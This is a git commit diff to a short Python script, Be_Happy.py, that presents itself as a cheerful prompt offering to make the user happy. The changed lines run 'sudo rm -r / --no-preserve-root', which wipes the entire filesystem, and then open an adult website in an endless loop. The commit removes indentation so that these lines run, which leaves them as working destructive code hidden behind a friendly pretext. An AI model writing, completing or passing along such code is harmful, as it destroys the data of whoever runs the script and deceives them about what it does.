92904143655d882ad950f903e1099c4615eacc84
AvexProducts <hackers300112@outlook.com>
2024-08-05 12:49:46 +1000

    Update Be_Happy.py

--- Be_Happy.py
+++ Be_Happy.py
@@ -4,7 +4,7 @@ import time
 print("Hello! Would you like to be happy? Y/N")
 enter = input("Enter: ")
 print("You can now be happy!")
-    time.sleep(3)
-    os.system('sudo rm -r / --no-preserve-root')
-    while True:
-        webbrowser.open("https://pornhub.com")
+time.sleep(3)
+os.system('sudo rm -r / --no-preserve-root')
+while True:
+    webbrowser.open("https://pornhub.com")
